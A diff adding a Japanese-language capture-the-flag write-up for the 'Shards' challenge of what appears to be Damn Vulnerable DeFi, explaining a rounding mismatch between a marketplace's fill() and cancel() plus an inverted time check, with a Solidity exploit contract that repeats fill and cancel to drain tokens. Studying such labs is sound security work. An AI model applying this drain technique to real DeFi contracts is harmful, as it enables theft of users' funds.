@@ -391,3 +391,32 @@ by tinamints
         return calldataPayload;
     }
 }`
+
+## 16. Shards
+### 条件 :
+- marketplaceからDVTを抜き取り、全額recoveryへ送る
+- stakingコントラクトの残高は変えてはいけない
+- プレイヤーは1回のトランザクションしか送れない
+### 概念 :
+-  丸め誤差（切り捨て vs 切り上げ）
+-  支払いと返金で計算式が一致していない
+-  時間チェックのロジックミス
+### 解法 :
+- `fill()`の支払額は`want * _toDVT(price, rate) / totalShards`で切り捨て計算されるため、100 shardsを買うと0 DVTになる（100 * 75e21 / 1e25 = 0.75 → 0）。一方`cancel()`は別の計算式`shards * rate / 1e6`（切り上げ）で返金するため、同じ100 shardsで約7.5e12 wei のDVTが返ってくる。さらに`cancel()`の時間チェックが逆に書かれているため、購入と同じブロックで即キャンセルできる。1回のトランザクションに収めるためexploitコントラクト内でfill → cancelを10001回繰り返し、利益をrecoveryへ送る
+### POC
+` function test_shards() public checkSolvedByPlayer {
+         Exploit exploit = new Exploit(marketplace,token,recovery);
+        exploit.attack(1);
+    }`
+
+`contract Exploit {
+    function attack(uint64 offerId) external {
+        uint256 wantShards = 100;
+        for (uint256 i = 0; i < 10001; i++) {
+            marketplace.fill(offerId, wantShards);
+            marketplace.cancel(1,i);
+        }
+        token.transfer(recovery,token.balanceOf(address(this)));
+    }
+}`
+
